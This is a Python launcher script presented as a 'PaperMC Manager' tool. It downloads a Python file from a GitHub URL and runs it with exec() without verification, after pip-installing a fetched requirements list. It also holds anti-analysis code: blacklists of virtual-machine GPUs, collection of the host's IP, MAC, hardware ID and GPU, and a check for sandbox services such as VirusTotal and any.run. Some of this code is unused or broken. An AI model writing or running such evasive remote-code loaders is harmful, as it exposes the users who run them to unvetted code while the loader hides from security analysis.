import os
import sys
import socket
import uuid
import requests
import re
import subprocess
import ctypes
import importlib.util
from colorama import init, Fore, Style

# Initialize colorama
init(autoreset=True)

# Constants
BLACKLISTED_IPS = ['']
BLACKLISTED_MACS = ['']
BLACKLISTED_HWIDS = ['']
BLACKLISTED_GPUS = ['VirtualBox Graphics Adapter', 'VMware SVGA II']
MODULE_URL = 'https://raw.githubusercontent.com/sang765/PaperMC-Manager/main/paper_manager.py'
REQUIREMENTS_URL = 'https://raw.githubusercontent.com/sang765/PaperMC-Manager/main/requirements.txt'
SKIP_ENV_CHECK = os.getenv('SKIP_ENV_CHECK', 'False').lower() == 'true'

# Set console title
ctypes.windll.kernel32.SetConsoleTitleW("PaperMC Manager")

# Function to check internet connection
def is_connected():
    try:
        response = requests.get('https://www.google.com', timeout=5)
        return response.status_code == 200
    except requests.ConnectionError:
        return False

# Function to install requirements
def install_requirements(requirements_url):
    try:
        response = requests.get(requirements_url)
        response.raise_for_status()
        requirements = response.text

        with open('requirements.txt', 'w') as file:
            file.write(requirements)

        subprocess.check_call([sys.executable, '-m', 'pip', 'install', '-r', 'requirements.txt'])
        os.remove('requirements.txt')
        print("Requirements installed successfully.")
    except requests.RequestException as e:
        print(f"Error downloading requirements: {e}")
    except subprocess.CalledProcessError as e:
        print(f"Error installing requirements: {e}")

# Function to load module from GitHub
def load_module_from_github(url):
    try:
        response = requests.get(url)
        response.raise_for_status()
        code = response.text

        module_name = 'dynamic_module'
        spec = importlib.util.spec_from_loader(module_name, loader=None)
        module = importlib.util.module_from_spec(spec)
        exec(code, module.__dict__)

        functions = [attr for attr in dir(module) if callable(getattr(module, attr))]
        print("Available functions in the module:", functions)

        if 'menu' in functions:
            print("Calling 'menu' function...")
            module.menu()
        else:
            print("Module does not contain 'menu' function.")
        return module
    except requests.RequestException as e:
        print(f"Error downloading module: {e}")
    except Exception as e:
        print(f"Error loading module: {e}")
    return None

# Function to get system info
def get_system_info():
    ip_address = socket.gethostbyname(socket.gethostname())
    mac_address = ':'.join(re.findall('..', '%012x' % uuid.getnode()))
    hwid = subprocess.check_output('wmic csproduct get uuid').decode().split('\n')[1].strip()
    gpu_info = subprocess.check_output("wmic path win32_videocontroller get caption").decode()
    gpu = [gpu.strip() for gpu in gpu_info.splitlines()[1:] if gpu.strip()][0] if gpu_info else "Unknown GPU"
    return ip_address, mac_address, hwid, gpu

def detect_environment():
    analysis_indicators = [
        'virustotal', 'hybrid-analysis', 'cuckoo', 'malwr',
        'any.run', 'reverse.it', 'joe sandbox', 'threatgrid',
        'cape sandbox', 'totalhash', 'intezer'
    ]

    output = subprocess.check_output('systeminfo').decode().upper()
    hostname = socket.gethostname().lower()
    username = os.getlogin().lower()

    for indicator in analysis_indicators:
        if indicator in output or indicator in hostname or indicator in username:
            return True

    try:
        if requests.get('https://www.virustotal.com/').status_code == 200:
            return True
    except:
        pass

    return False


# Main function
def main():
    ip_address, mac_address, hwid, gpu = get_system_info()

    if is_connected():
        print("Internet connection detected. Please wait...")
        install_requirements(REQUIREMENTS_URL)
        module = load_module_from_github(MODULE_URL)

        if module:
            print("Module loaded successfully.")
            if hasattr(module, 'main'):
                module.main()
            else:
                print("Module does not contain 'main' function.")
        else:
            print("Failed to load module.")
    else:
        print("No internet connection.")

if __name__ == "__main__":
    main()
